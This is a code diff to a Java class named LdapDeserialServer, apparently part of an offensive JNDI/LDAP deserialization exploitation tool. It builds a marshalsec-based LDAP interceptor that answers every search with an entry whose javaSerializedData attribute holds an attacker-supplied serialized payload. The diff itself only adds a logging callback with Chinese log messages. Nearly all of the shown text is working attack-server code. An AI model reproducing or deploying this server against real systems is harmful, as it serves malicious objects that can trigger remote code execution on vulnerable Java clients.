@@ -128,7 +128,8 @@ public class LdapDeserialServer {
             URLClassLoader interceptorCl = new URLClassLoader(
                 new URL[]{tempDir.toUri().toURL(), marshalsecUrl}, parentCl);
             Class<?> clazz = interceptorCl.loadClass(INTERCEPTOR_CLASS_NAME);
-            return clazz.getConstructor(byte[].class).newInstance((Object) serializedPayload);
+            return clazz.getConstructor(byte[].class, Consumer.class)
+                .newInstance(serializedPayload, logger);
         } finally {
             FileCleanup.deleteRecursivelyQuietly(tempDir);
         }
@@ -166,18 +167,25 @@ public class LdapDeserialServer {
             + "import com.unboundid.ldap.sdk.Entry;\n"
             + "import com.unboundid.ldap.sdk.LDAPResult;\n"
             + "import com.unboundid.ldap.sdk.ResultCode;\n"
+            + "import java.util.function.Consumer;\n"
             + "public class LdapDeserialInterceptor extends InMemoryOperationInterceptor {\n"
             + "  private final byte[] payload;\n"
-            + "  public LdapDeserialInterceptor(byte[] payload) { this.payload = payload; }\n"
+            + "  private final Consumer<String> logger;\n"
+            + "  public LdapDeserialInterceptor(byte[] payload, Consumer<String> logger) {\n"
+            + "    this.payload = payload;\n"
+            + "    this.logger = logger;\n"
+            + "  }\n"
             + "  @Override\n"
             + "  public void processSearchResult(InMemoryInterceptedSearchResult result) {\n"
             + "    try {\n"
             + "      String base = result.getRequest().getBaseDN();\n"
+            + "      if (logger != null) logger.accept(\"[LDAP-Deser] 收到查询: baseDN=\" + base);\n"
             + "      Entry entry = new Entry(base);\n"
             + "      entry.addAttribute(\"javaClassName\", \"java.lang.String\");\n"
             + "      entry.addAttribute(\"javaSerializedData\", payload);\n"
             + "      result.sendSearchEntry(entry);\n"
             + "      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));\n"
+            + "      if (logger != null) logger.accept(\"[LDAP-Deser] 已返回 javaSerializedData: \" + payload.length + \" bytes\");\n"
             + "    } catch (Exception e) {\n"
             + "      throw new RuntimeException(e);\n"
             + "    }\n"
